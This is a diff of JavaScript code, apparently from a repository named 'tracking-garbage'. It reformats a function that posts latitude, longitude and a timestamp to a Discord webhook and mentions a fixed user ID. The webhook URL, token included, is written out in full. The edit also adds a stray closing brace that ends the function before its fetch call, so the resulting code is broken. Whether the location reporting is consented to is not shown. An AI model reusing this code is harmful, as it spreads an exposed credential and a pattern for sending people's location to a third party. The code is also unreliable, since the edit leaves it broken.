@@ -274,18 +274,20 @@
         const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1313573225992814722/WHA9GV0JZCiSr0l9qLSl-4CThGVLqDT_dNgH9B87lttJb128znB7HUdHfzx3RfK345uE';
         const JanisUID = "789782857852911616"
         function sendToDiscord(latitude, longitude) {
-            const payload = {
-                embeds: [
-    {
-        image: {
-            url: "https://raw.githubusercontent.com/yhkq1/tracking-garbage/1e146e2c80794858dd8c6dd31eb50c9073e8a7a4/divider-36072_1.png"
-        }
-    }
-                content: `<@${JanisUID}>
+    const payload = {
+        embeds: [
+            {
+                image: {
+                    url: "https://raw.githubusercontent.com/yhkq1/tracking-garbage/1e146e2c80794858dd8c6dd31eb50c9073e8a7a4/divider-36072_1.png"
+                }
+            }
+        ],
+        content: `<@${JanisUID}>
 Latitude: ${latitude}
 Longitude: ${longitude}
 Timestamp: ${new Date().toISOString()}`
-            };
+    };
+}
             fetch(DISCORD_WEBHOOK_URL, {
                 method: 'POST',
                 headers: {
